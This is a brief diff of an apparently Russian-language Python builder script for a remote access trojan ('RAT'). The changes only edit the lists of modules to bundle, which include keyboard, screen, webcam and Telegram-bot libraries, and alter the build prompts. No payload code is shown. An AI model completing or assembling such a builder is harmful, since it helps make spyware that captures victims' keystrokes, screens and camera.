@@ -93,8 +93,7 @@ name = 'main'#input('\n* Введите название файла:\n* > ')
 description = 'test'#input('\n* Введите описание файла:\n* > ')
 version = '2'#input('\n* Введите версию файла:\n* > ')
 
-included_modules = ['os', 'sys', 'ctypes', 'datetime', 'platform', 'subprocess',
-                    'requests', 'wget', 'pyautogui', 'keyboard', 'telebot', 'cryptography']
+included_modules = ['ctypes', 'datetime', 'os', 'platform', 'subprocess', 'requests', 'wget', 'pyautogui', 'keyboard', 'telebot', 'cryptography', 'cv2']
 
 print('\n* Данные записаны, начинаю писать декодер исходного кода и генерировать файл для компиляции...')
 
@@ -113,7 +112,7 @@ name = input('\n* Введите название файла:\n* > ')
 description = input('\n* Введите описание файла:\n* > ')
 version = input('\n* Введите версию файла:\n* > ')
 
-included_modules = ['asyncio', 'ctypes', 'datetime', 'os', 'platform', 'subprocess', 'requests', 'wget', 'pyautogui', 'keyboard', 'telebot', 'cryptography', 'cv2', 'tkinter', 'messagebox', 'ctypes', 'sys']
+included_modules = ['asyncio', 'subprocess', 'tkinter', 'messagebox', 'ctypes', 'sys']
 
 print('\n* RAT готов, подготавливаю watchdog...')
 
